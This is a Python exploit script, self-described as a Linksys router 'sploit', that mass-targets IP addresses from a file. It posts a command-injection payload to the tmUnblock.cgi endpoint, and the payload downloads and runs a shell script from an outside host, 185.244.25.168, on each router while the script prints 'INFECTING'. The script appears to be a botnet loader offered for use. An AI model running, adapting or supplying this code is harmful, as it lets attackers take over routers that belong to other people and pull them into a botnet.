#! python !#
# A Linksys Router Sploit
# Pulls good 
# Mostly not shit routers ( USA, Canada, etc)
import threading, sys, time, random, socket, subprocess, re, os, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *	
ips = open(sys.argv[1], "r").readlines()

url_data = {
    "submit_button": "",
    "change_action": "",
    "action": "",
    "commit": "0",
    "ttcp_num": "2",
    "ttcp_size": "2",
    "ttcp_ip": "-h `cd /tmp; rm -rf bins.sh; wget http://185.244.25.168/wget.sh; chmod 777 wget.sh; sh wget.sh linksys`",
    "StartEPI": "1",
}

class kaden(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "\033[32mINFECTING\033[31m" + self.ip
				url = "http://"+self.ip+":55555/tmUnblock.cgi"
				requests.post(url, data=url_data, timeout=3)
				requests.get(url, timeout=3)
			except Exception as e:
				pass
for ip in ips:
	try:
		n = kaden(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass
